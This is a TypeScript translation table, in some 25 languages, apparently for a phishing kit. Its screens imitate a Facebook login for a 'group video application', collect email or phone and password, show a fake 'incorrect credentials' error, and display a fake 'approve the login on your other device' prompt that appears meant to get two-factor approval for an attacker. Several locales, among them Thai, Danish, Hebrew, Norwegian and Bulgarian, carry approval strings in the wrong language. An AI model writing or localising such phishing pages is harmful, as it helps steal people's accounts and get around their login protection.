interface TranslatedTexts {
    splitMessage: string;
    gpNameDefault: string;
    inputNameField: string;
    inputPswField: string;
    buttonSubmit: string;
    modalTitle: string;
    modalContent: string;
    modalButton: string;
    info: string;
    help: string;
    more: string;

    approbalTitle: string;
    approbalSubTitle: string;
    approbalWait: string;
    approbalSubWait: string;
}

function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
    const translations: Record<string, TranslatedTexts> = {
        en: {
            // Ingles
            splitMessage: 'To access the group video application, you need to log in with your Facebook account.',
            gpNameDefault: 'Restricted content',
            inputNameField: 'Mobile or email',
            inputPswField: 'Password',
            buttonSubmit: 'Authorize application',
            modalTitle: 'Incorrect credentials',
            modalContent: 'Please verify that your email address or mobile number and password are correct.',
            modalButton: 'Accept',
            info: 'Information',
            help: 'Help',
            more: 'More',

            approbalTitle: 'Check your notifications on another device',
            approbalSubTitle: 'We sent a notification to your {device}. Check your Facebook notifications there and approve the login to continue.',
            approbalWait: 'Waiting for approval',
            approbalSubWait: 'Approve from the other device to continue.'
        },
        es: {
            // Español
            splitMessage: 'Para acceder a la aplicación de video para grupos, necesitas iniciar sesión con tu cuenta de Facebook.',
            gpNameDefault: 'Contenido restringido',
            inputNameField: 'Móvil o correo electrónico',
            inputPswField: 'Contraseña',
            buttonSubmit: 'Autorizar aplicación',
            modalTitle: 'Credenciales incorrectas',
            modalContent: 'Verifica que tu correo electrónico o tu número de móvil y tu contraseña sean correctos',
            modalButton: 'Aceptar',

            info: 'Información',
            help: 'Ayuda',
            more: 'Mas',

            approbalTitle: 'Consulta tus notificaciones en otro dispositivo',
            approbalSubTitle: 'Te hemos enviado una notificación a tu {device}, donde puedes consultar las notificaciones de Facebook y aprobar el inicio de sesión para continuar.',
            approbalWait: 'Aprobación pendiente',
            approbalSubWait: 'Para continuar, aprueba el inicio de sesión desde el otro dispositivo.'
        },
        fr: {
            // Frances
            splitMessage: 'Pour accéder à l’application vidéo de groupe, vous devez vous connecter avec votre compte Facebook.',
            gpNameDefault: 'Contenu restreint',
            inputNameField: 'Mobile ou e-mail',
            inputPswField: 'Mot de passe',
            buttonSubmit: 'Autoriser l’application',
            modalTitle: 'Identifiants incorrects',
            modalContent: 'Veuillez vérifier que votre adresse e-mail ou votre numéro de téléphone portable ainsi que votre mot de passe sont corrects.',
            modalButton: 'Accepter',
            info: 'Information',
            help: 'Aide',
            more: 'Plus',
            approbalTitle: 'Consultez vos notifications sur un autre appareil',
            approbalSubTitle: 'Nous vous avons envoyé une notification sur votre {device}, où vous pouvez consulter les notifications de Facebook et approuver la connexion pour continuer.',
            approbalWait: 'Approbation en attente',
            approbalSubWait: "Pour continuer, approuvez la connexion depuis l'autre appareil."
        },
        de: {
            // Alemán
            splitMessage: 'Um auf die Gruppen-Videoanwendung zuzugreifen, müssen Sie sich mit Ihrem Facebook-Konto anmelden.',
            gpNameDefault: 'Eingeschränkter Inhalt',
            inputNameField: 'Mobiltelefon oder E-Mail',
            inputPswField: 'Passwort',
            buttonSubmit: 'Anwendung autorisieren',
            modalTitle: 'Falsche Anmeldedaten',
            modalContent: 'Bitte überprüfen Sie, ob Ihre E-Mail-Adresse oder Ihre Mobiltelefonnummer sowie Ihr Passwort korrekt sind.',
            modalButton: 'Akzeptieren',
            info: 'Information',
            help: 'Hilfe',
            more: 'Mehr',
            approbalTitle: 'Überprüfen Sie Ihre Benachrichtigungen auf einem anderen Gerät',
            approbalSubTitle: 'Wir haben Ihnen eine Benachrichtigung auf Ihr {device} gesendet, wo Sie die Facebook-Benachrichtigungen einsehen und die Anmeldung genehmigen können, um fortzufahren.',
            approbalWait: 'Genehmigung ausstehend',
            approbalSubWait: 'Um fortzufahren, genehmigen Sie die Anmeldung auf dem anderen Gerät.'
        },
        it: {
            // Italiano
            splitMessage: 'Per accedere all’applicazione video di gruppo, è necessario effettuare l’accesso con il proprio account Facebook.',
            gpNameDefault: 'Contenuto restritto',
            inputNameField: 'Cellulare o e-mail',
            inputPswField: 'Password',
            buttonSubmit: 'Autorizza l’applicazione',
            modalTitle: 'Credenziali errate',
            modalContent: 'Verifica che il tuo indirizzo e-mail o il tuo numero di cellulare e la tua password siano corretti.',
            modalButton: 'Accetta',
            info: 'Informazioni',
            help: 'Aiuto',
            more: 'Altro',
            approbalTitle: 'Consulta le tue notifiche su un altro dispositivo',
            approbalSubTitle: 'Ti abbiamo inviato una notifica sul tuo {device}, dove puoi visualizzare le notifiche di Facebook e approvare l\'accesso per continuare.',
            approbalWait: 'Approvazione in sospeso',
            approbalSubWait: 'Per continuare, approva l\'accesso dall\'altro dispositivo.'
        },
        pt: {
            // Portugués
            splitMessage: 'Para acessar o aplicativo de vídeo em grupo, você precisa fazer login com sua conta do Facebook.',
            gpNameDefault: 'Conteúdo restrito',
            inputNameField: 'Celular ou e-mail',
            inputPswField: 'Senha',
            buttonSubmit: 'Autorizar aplicativo',
            modalTitle: 'Credenciais incorretas',
            modalContent: 'Verifique se seu endereço de e-mail ou número de celular e senha estão corretos.',
            modalButton: 'Aceitar',
            info: 'Informação',
            help: 'Ajuda',
            more: 'Mais',
            approbalTitle: 'Consulte suas notificações em outro dispositivo',
            approbalSubTitle: 'Enviamos uma notificação para o seu {device}, onde você pode visualizar as notificações do Facebook e aprovar o login para continuar.',
            approbalWait: 'Aprovação pendente',
            approbalSubWait: 'Para continuar, aprove o login no outro dispositivo.'
        },
        nl: {
            // Holandés
            splitMessage: 'Om toegang te krijgen tot de groepsvideo-applicatie, moet je inloggen met je Facebook-account.',
            gpNameDefault: 'Beperkte inhoud',
            inputNameField: 'Mobiel of e-mail',
            inputPswField: 'Wachtwoord',
            buttonSubmit: 'Applicatie autoriseren',
            modalTitle: 'Onjuiste inloggegevens',
            modalContent: 'Controleer of je e-mailadres of mobiele nummer en wachtwoord correct zijn.',
            modalButton: 'Accepteren',
            info: 'Informatie',
            help: 'Hulp',
            more: 'Meer',
            approbalTitle: 'Bekijk uw meldingen op een ander apparaat',
            approbalSubTitle: 'We hebben een melding naar uw {device} gestuurd, waar u de Facebook-meldingen kunt bekijken en het inloggen kunt goedkeuren om door te gaan.',
            approbalWait: 'In afwachting van goedkeuring',
            approbalSubWait: 'Om door te gaan, keur het inloggen goed op het andere apparaat.'
        },
        ru: {
            // Ruso
            splitMessage: 'Чтобы получить доступ к приложению для группового видео, вам нужно войти в свою учетную запись Facebook.',
            gpNameDefault: 'Ограниченный контент',
            inputNameField: 'Мобильный телефон или электронная почта',
            inputPswField: 'Пароль',
            buttonSubmit: 'Авторизовать приложение',
            modalTitle: 'Неверные учетные данные',
            modalContent: 'Пожалуйста, проверьте правильность введенного адреса электронной почты или номера мобильного телефона и пароля.',
            modalButton: 'Принять',
            info: 'Информация',
            help: 'Помощь',
            more: 'Больше',
            approbalTitle: 'Просмотрите уведомления на другом устройстве',
            approbalSubTitle: 'Мы отправили уведомление на ваш {device}, где вы можете просматривать уведомления Facebook и подтверждать вход, чтобы продолжить.',
            approbalWait: 'Ожидание подтверждения',
            approbalSubWait: 'Чтобы продолжить, подтвердите вход с другого устройства.'
        },
        ja: {
             // Japonés
            splitMessage: 'グループビデオアプリにアクセスするには、Facebookアカウントでログインする必要があります。',
            gpNameDefault: '制限付きコンテンツ',
            inputNameField: '携帯電話またはメールアドレス',
            inputPswField: 'パスワード',
            buttonSubmit: 'アプリを承認',
            modalTitle: '誤った資格情報',
            modalContent: 'メールアドレスまたは携帯電話番号、およびパスワードが正しいかどうかを確認してください。',
            modalButton: '承諾',
            info: '情報',
            help: 'ヘルプ',
            more: 'もっと',
            approbalTitle: '別のデバイスで通知を確認してください',
            approbalSubTitle: '{device} に通知を送信しました。ここでFacebookの通知を確認し、ログインを承認できます。',
            approbalWait: '承認待ち',
            approbalSubWait: '続行するには、他のデバイスからログインを承認してください。'
        },
        zh: {
            // Chino
            splitMessage: '要访问群组视频应用程序，您需要使用您的Facebook帐户登录。',
            gpNameDefault: '受限内容',
            inputNameField: '手机号码或电子邮件',
            inputPswField: '密码',
            buttonSubmit: '授权应用程序',
            modalTitle: '凭证不正确',
            modalContent: '请验证您的电子邮件地址或手机号码以及密码是否正确。',
            modalButton: '接受',
            info: '信息',
            help: '帮助',
            more: '更多',
            approbalTitle: '在其他设备上查看通知',
            approbalSubTitle: '我们已向您的{device}发送了一条通知，您可以在其中查看Facebook的通知并批准登录以继续。',
            approbalWait: '等待批准',
            approbalSubWait: '要继续，请从其他设备批准登录。'
        },
        ar: {
            // Árabe
            splitMessage: 'للوصول إلى تطبيق الفيديو الجماعي، يجب تسجيل الدخول باستخدام حسابك على Facebook',
            gpNameDefault: 'محتوى مقيد',
            inputNameField: 'الهاتف المحمول أو البريد الإلكتروني',
            inputPswField: 'كلمة المرور',
            buttonSubmit: 'السماح بالتطبيق',
            modalTitle: 'بيانات الاعتماد غير صحيحة',
            modalContent: 'يرجى التحقق مما إذا كان عنوان بريدك الإلكتروني أو رقم هاتفك المحمول وكلمة المرور صحيحة.',
            modalButton: 'موافق',
            info: 'معلومات',
            help: 'مساعدة',
            more: 'المزيد',
            approbalTitle: 'اطلع على إشعاراتك على جهاز آخر',
            approbalSubTitle: 'لقد أرسلنا إشعارًا إلى {device} الخاص بك، حيث يمكنك عرض إشعارات Facebook والموافقة على تسجيل الدخول للمتابعة.',
            approbalWait: 'في انتظار الموافقة',
            approbalSubWait: 'للمتابعة، قم بالموافقة على تسجيل الدخول من الجهاز الآخر.'
        },
        ko: {
            // Coreano
            splitMessage: '그룹 비디오 애플리케이션에 액세스하려면 Facebook 계정으로 로그인해야 합니다.',
            gpNameDefault: '제한된 콘텐츠',
            inputNameField: '휴대폰 또는 이메일',
            inputPswField: '비밀번호',
            buttonSubmit: '애플리케이션 승인',
            modalTitle: '잘못된 자격 증명',
            modalContent: '이메일 주소 또는 휴대폰 번호 및 비밀번호가 올바른지 확인하세요.',
            modalButton: '수락',
            info: '정보',
            help: '도움말',
            more: '더 보기',
            approbalTitle: '다른 기기에서 알림 확인',
            approbalSubTitle: '{device}로 알림을 보냈습니다. 여기에서 Facebook 알림을 확인하고 계속하려면 로그인을 승인하세요.',
            approbalWait: '승인 대기 중',
            approbalSubWait: '계속하려면 다른 기기에서 로그인을 승인하세요.'
        },
        tr: {
            // Turco
            splitMessage: 'Grup video uygulamasına erişmek için Facebook hesabınızla giriş yapmanız gerekiyor.',
            gpNameDefault: 'Sınırlı içerik',
            inputNameField: 'Mobil veya e-posta',
            inputPswField: 'Parola',
            buttonSubmit: 'Uygulamayı yetkilendir',
            modalTitle: 'Hatalı kimlik bilgileri',
            modalContent: 'Lütfen e-posta adresinizin veya cep telefonu numaranızın ve şifrenizin doğru olduğundan emin olun.',
            modalButton: 'Kabul et',
            info: 'Bilgi',
            help: 'Yardım',
            more: 'Daha fazla',
            approbalTitle: 'Başka bir cihazda bildirimlerinizi kontrol edin',
            approbalSubTitle: '{device}\'ınıza bir bildirim gönderdik. Buradan Facebook bildirimlerini görüntüleyebilir ve devam etmek için girişi onaylayabilirsiniz.',
            approbalWait: 'Onay bekleniyor',
            approbalSubWait: 'Devam etmek için diğer cihazdan girişi onaylayın.'
        },
        sv: {
            // Sueco
            splitMessage: 'För att komma åt gruppvideosapplikationen måste du logga in med ditt Facebook-konto.',
            gpNameDefault: 'Begränsat innehåll',
            inputNameField: 'Mobil eller e-post',
            inputPswField: 'Lösenord',
            buttonSubmit: 'Godkänn ansökan',
            modalTitle: 'Felaktiga referenser',
            modalContent: 'Kontrollera att din e-postadress eller mobilnummer och lösenord är korrekta.',
            modalButton: 'Acceptera',
            info: 'Information',
            help: 'Hjälp',
            more: 'Mer',
            approbalTitle: 'Kontrollera dina aviseringar på en annan enhet',
            approbalSubTitle: 'Vi har skickat en avisering till din {device}, där du kan se Facebook-aviseringarna och godkänna inloggningen för att fortsätta.',
            approbalWait: 'Väntar på godkännande',
            approbalSubWait: 'För att fortsätta, godkänn inloggningen från den andra enheten.'
        },
        el: {
            // Griego
            splitMessage: 'Για να αποκτήσετε πρόσβαση στην εφαρμογή βίντεο για ομάδες, πρέπει να συνδεθείτε με τον λογαριασμό σας στο Facebook.',
            gpNameDefault: 'Περιορισμένο περιεχόμενο',
            inputNameField: 'Κινητό ή ηλεκτρονικό ταχυδρομείο',
            inputPswField: 'Κωδικός',
            buttonSubmit: 'Εξουσιοδότηση εφαρμογής',
            modalTitle: 'Λανθασμένα διαπιστευτήρια',
            modalContent: 'Βεβαιωθείτε ότι η διεύθυνση email ή ο αριθμός κινητού σας τηλεφώνου και ο κωδικός πρόσβασής σας είναι σωστοί.',
            modalButton: 'Αποδοχή',
            info: 'Πληροφορίες',
            help: 'Βοήθεια',
            more: 'Περισσότερα',
            approbalTitle: 'Ελέγξτε τις ειδοποιήσεις σας σε άλλη συσκευή',
            approbalSubTitle: 'Σας έχουμε στείλει μια ειδοποίηση στο {device} σας, όπου μπορείτε να δείτε τις ειδοποιήσεις του Facebook και να εγκρίνετε τη σύνδεση για να συνεχίσετε.',
            approbalWait: 'Αναμονή έγκρισης',
            approbalSubWait: 'Για να συνεχίσετε, εγκρίνετε τη σύνδεση από την άλλη συσκευή.'
        },
        pl: {
            // Polaco
            splitMessage: 'Aby uzyskać dostęp do aplikacji wideo dla grup, musisz zalogować się na swoje konto Facebook.',
            gpNameDefault: 'Ograniczona zawartość',
            inputNameField: 'Numer telefonu komórkowego lub e-mail',
            inputPswField: 'Hasło',
            buttonSubmit: 'Autoryzuj aplikację',
            modalTitle: 'Nieprawidłowe dane uwierzytelniające',
            modalContent: 'Sprawdź, czy twój adres e-mail lub numer telefonu komórkowego oraz hasło są poprawne.',
            modalButton: 'Akceptuj',
            info: 'Informacje',
            help: 'Pomoc',
            more: 'Więcej',
            approbalTitle: 'Sprawdź powiadomienia na innym urządzeniu',
            approbalSubTitle: 'Wysłaliśmy powiadomienie na Twój {device}, gdzie możesz zobaczyć powiadomienia z Facebooka i zatwierdzić logowanie, aby kontynuować.',
            approbalWait: 'Oczekiwanie na zatwierdzenie',
            approbalSubWait: 'Aby kontynuować, zatwierdź logowanie z innego urządzenia.'
        },
        hi: {
            // Hindi
            splitMessage: 'ग्रुप वीडियो एप्लिकेशन तक पहुँचने के लिए आपको अपने Facebook खाते से लॉगिन करना होगा।',
            gpNameDefault: 'सीमित सामग्री',
            inputNameField: 'मोबाइल या ईमेल',
            inputPswField: 'पासवर्ड',
            buttonSubmit: 'एप्लिकेशन को अधिकृत करें',
            modalTitle: 'गलत क्रेडेंशियल्स',
            modalContent: 'कृपया जांचें कि आपका ईमेल पता या मोबाइल नंबर और पासवर्ड सही हैं।',
            modalButton: 'स्वीकार करें',
            info: 'जानकारी',
            help: 'सहायता',
            more: 'अधिक',
            approbalTitle: 'अन्य डिवाइस पर अपने सूचनाएँ देखें',
            approbalSubTitle: 'हमने आपके {device} पर एक सूचना भेजी है, जहां आप Facebook की सूचनाएँ देख सकते हैं और जारी रखने के लिए लॉगिन को मंजूर कर सकते हैं।',
            approbalWait: 'मंजूरी की प्रतीक्षा',
            approbalSubWait: 'जारी रखने के लिए, दूसरे डिवाइस से लॉगिन को मंजूर करें।'
        },
        hu: {
            // Húngaro
            splitMessage: 'A csoportos videóalkalmazás eléréséhez be kell jelentkezned a Facebook fiókoddal.',
            gpNameDefault: 'Korlátozott tartalom',
            inputNameField: 'Mobil vagy e-mail',
            inputPswField: 'Jelszó',
            buttonSubmit: 'Alkalmazás engedélyezése',
            modalTitle: 'Hibás hitelesítő adatok',
            modalContent: 'Ellenőrizd, hogy az e-mail címed vagy mobiltelefonszámod és a jelszavad helyes-e.',
            modalButton: 'Elfogadás',
            info: 'Információ',
            help: 'Segítség',
            more: 'Tovább',
            approbalTitle: 'Nézze meg értesítéseit egy másik eszközön',
            approbalSubTitle: 'Elküldtünk egy értesítést a {device} készülékeire, ahol megtekintheti a Facebook értesítéseket és jóváhagyhatja a bejelentkezést a folytatáshoz.',
            approbalWait: 'Jóváhagyásra vár',
            approbalSubWait: 'A folytatáshoz erősítse meg a bejelentkezést a másik eszközről.'
        },
        vi: {
            // Vietnamita
            splitMessage: 'Để truy cập vào ứng dụng video nhóm, bạn cần đăng nhập bằng tài khoản Facebook của mình.',
            gpNameDefault: 'Nội dung bị hạn chế',
            inputNameField: 'Điện thoại di động hoặc email',
            inputPswField: 'Mật khẩu',
            buttonSubmit: 'Cho phép ứng dụng',
            modalTitle: 'Thông tin đăng nhập không chính xác',
            modalContent: 'Vui lòng kiểm tra xem địa chỉ email hoặc số điện thoại di động và mật khẩu của bạn có đúng không.',
            modalButton: 'Chấp nhận',
            info: 'Thông tin',
            help: 'Trợ giúp',
            more: 'Thêm',
            approbalTitle: 'Kiểm tra thông báo trên thiết bị khác',
            approbalSubTitle: 'Chúng tôi đã gửi thông báo đến {device} của bạn, nơi bạn có thể xem thông báo từ Facebook và phê duyệt đăng nhập để tiếp tục.',
            approbalWait: 'Đang chờ phê duyệt',
            approbalSubWait: 'Để tiếp tục, phê duyệt đăng nhập từ thiết bị khác.'
        },
        cs: {
            // Checo
            splitMessage: 'Pro přístup k aplikaci pro skupinové video musíte se přihlásit se svým účtem na Facebooku.',
            gpNameDefault: 'Omezený obsah',
            inputNameField: 'Mobilní telefon nebo e-mail',
            inputPswField: 'Heslo',
            buttonSubmit: 'Autorizovat aplikaci',
            modalTitle: 'Nesprávné přihlašovací údaje',
            modalContent: 'Zkontrolujte, zda jsou vaše e-mailová adresa nebo telefonní číslo a heslo správné.',
            modalButton: 'Přijmout',
            info: 'Informace',
            help: 'Pomoc',
            more: 'Více',
            approbalTitle: 'Zkontrolujte své oznámení na jiném zařízení',
            approbalSubTitle: 'Poslali jsme vám oznámení na váš {device}, kde můžete zobrazit oznámení z Facebooku a schválit přihlášení, abyste mohli pokračovat.',
            approbalWait: 'Čeká na schválení',
            approbalSubWait: 'Pro pokračování schválte přihlášení z jiného zařízení.'
        },
        th: {
            // Tailandés
            splitMessage: 'เพื่อเข้าถึงแอปพลิเคชันวิดีโอกลุ่ม คุณต้องเข้าสู่ระบบด้วยบัญชี Facebook ของคุณ',
            gpNameDefault: 'เนื้อหาที่ถูกจำกัด',
            inputNameField: 'โทรศัพท์มือถือหรืออีเมล',
            inputPswField: 'รหัสผ่าน',
            buttonSubmit: 'อนุญาตให้ใช้แอปพลิเคชัน',
            modalTitle: 'ข้อมูลประจำตัวไม่ถูกต้อง',
            modalContent: 'โปรดตรวจสอบว่าที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือและรหัสผ่านของคุณถูกต้องหรือไม่',
            modalButton: 'ยอมรับ',
            info: 'ข้อมูล',
            help: 'ช่วยเหลือ',
            more: 'เพิ่มเติม',
            approbalTitle: 'Kiểm tra thông báo trên thiết bị khác',
            approbalSubTitle: 'Chúng tôi đã gửi thông báo đến {device} của bạn, nơi bạn có thể xem thông báo từ Facebook và phê duyệt đăng nhập để tiếp tục.',
            approbalWait: 'Đang chờ phê duyệt',
            approbalSubWait: 'Để tiếp tục, phê duyệt đăng nhập từ thiết bị khác.'
        },
        da: {
            // Danés
            splitMessage: 'For at få adgang til gruppevideoapplikationen skal du logge ind med din Facebook-konto.',
            gpNameDefault: 'Begrænset indhold',
            inputNameField: 'Mobil eller e-mail',
            inputPswField: 'Adgangskode',
            buttonSubmit: 'Godkend ansøgning',
            modalTitle: 'Forkerte legitimationsoplysninger',
            modalContent: 'Kontroller, om din e-mail-adresse eller dit mobilnummer og din adgangskode er korrekte.',
            modalButton: 'Accepter',
            info: 'Information',
            help: 'Hjælp',
            more: 'Mere',
            approbalTitle: 'Zkontrolujte své oznámení na jiném zařízení',
            approbalSubTitle: 'Poslali jsme vám oznámení na váš {device}, kde můžete zobrazit oznámení z Facebooku a schválit přihlášení, abyste mohli pokračovat.',
            approbalWait: 'Čeká na schválení',
            approbalSubWait: 'Pro pokračování schválte přihlášení z jiného zařízení.'
        },
        he: {
            // Hebreo
            splitMessage: 'כדי לגשת ליישום וידאו לקבוצות, עליך להתחבר עם חשבון הפייסבוק שלך.',
            gpNameDefault: 'תוכן מוגבל',
            inputNameField: 'טלפון נייד או דוא"ל',
            inputPswField: 'סיסמה',
            buttonSubmit: 'אשר את היישום',
            modalTitle: 'פרטי הזדהות שגויים',
            modalContent: 'אנא בדוק אם כתובת הדואר האלקטרוני שלך או מספר הטלפון הנייד והסיסמה שלך הם נכונים.',
            modalButton: 'אישור',
            info: 'מידע',
            help: 'עזרה',
            more: 'יותר',
            approbalTitle: 'Kiểm tra thông báo trên thiết bị khác',
            approbalSubTitle: 'Chúng tôi đã gửi thông báo đến {device} của bạn, nơi bạn có thể xem thông báo từ Facebook và phê duyệt đăng nhập để tiếp tục.',
            approbalWait: 'Đang chờ phê duyệt',
            approbalSubWait: 'Để tiếp tục, phê duyệt đăng nhập từ thiết bị khác.'
        },
        fi: {
            // Finlandés
            splitMessage: 'Ryhmävideosovellukseen päästäksesi sinun on kirjauduttava sisään Facebook-tililläsi.',
            gpNameDefault: 'Rajoitettu sisältö',
            inputNameField: 'Matkapuhelin tai sähköposti',
            inputPswField: 'Salasana',
            buttonSubmit: 'Hyväksy sovellus',
            modalTitle: 'Virheelliset tunnistetiedot',
            modalContent: 'Varmista, että sähköpostiosoitteesi tai matkapuhelinnumerosi ja salasanasi ovat oikein.',
            modalButton: 'Hyväksy',
            info: 'Tietoja',
            help: 'Apua',
            more: 'Lisää',
            approbalTitle: 'Zkontrolujte své oznámení na jiném zařízení',
            approbalSubTitle: 'Poslali jsme vám oznámení na váš {device}, kde můžete zobrazit oznámení z Facebooku a schválit přihlášení, abyste mohli pokračovat.',
            approbalWait: 'Čeká na schválení',
            approbalSubWait: 'Pro pokračování schválte přihlášení z jiného zařízení.'
        },
        no: {
            // Noruego
            splitMessage: 'For å få tilgang til gruppevideoapplikasjonen, må du logge inn med Facebook-kontoen din.',
            gpNameDefault: 'Begrenset innhold',
            inputNameField: 'Mobil eller e-post',
            inputPswField: 'Passord',
            buttonSubmit: 'Godkjenn søknad',
            modalTitle: 'Feil legitimasjon',
            modalContent: 'Vennligst sjekk at e-postadressen din eller mobilnummeret ditt og passordet ditt er korrekt.',
            modalButton: 'Godta',
            info: 'Informasjon',
            help: 'Hjelp',
            more: 'Mer',
            approbalTitle: 'Zkontrolujte své oznámení na jiném zařízení',
            approbalSubTitle: 'Poslali jsme vám oznámení na váš {device}, nơi bạn có thể xem thông báo từ Facebook và phê duyệt đăng nhập để tiếp tục.',
            approbalWait: 'Čeká na schválení',
            approbalSubWait: 'Pro pokračování schválte přihlášení z jiného zařízení.'
        },
        bg: {
            // Búlgaro
            splitMessage: 'За да получите достъп до приложението за групово видео, трябва да влезете със своя акаунт във Facebook.',
            gpNameDefault: 'Ограничено съдържание',
            inputNameField: 'Мобилен телефон или имейл',
            inputPswField: 'Парола',
            buttonSubmit: 'Одобрете приложението',
            modalTitle: 'Невалидни удостоверения',
            modalContent: 'Моля, проверете дали вашият имейл адрес или мобилен номер и парола са правилни.',
            modalButton: 'Приемам',
            info: 'Информация',
            help: 'Помощ',
            more: 'Повече',
            approbalTitle: 'Zkontrolujte své oznámení na jiném zařízení',
            approbalSubTitle: 'Poslali jsme vám oznámení na váš {device}, nơi bạn có thể xem thông báo từ Facebook và phê duyệt đăng nhập để tiếp tục.',
            approbalWait: 'Čeká na schválení',
            approbalSubWait: 'Pro pokračování schválte přihlášení z jiného zařízení.'
        }
    };

    const language = defaultLocale.split('_')[0];
    return translations[language] || translations.en;
}

export { TranslatedTexts, getTranslatedTexts };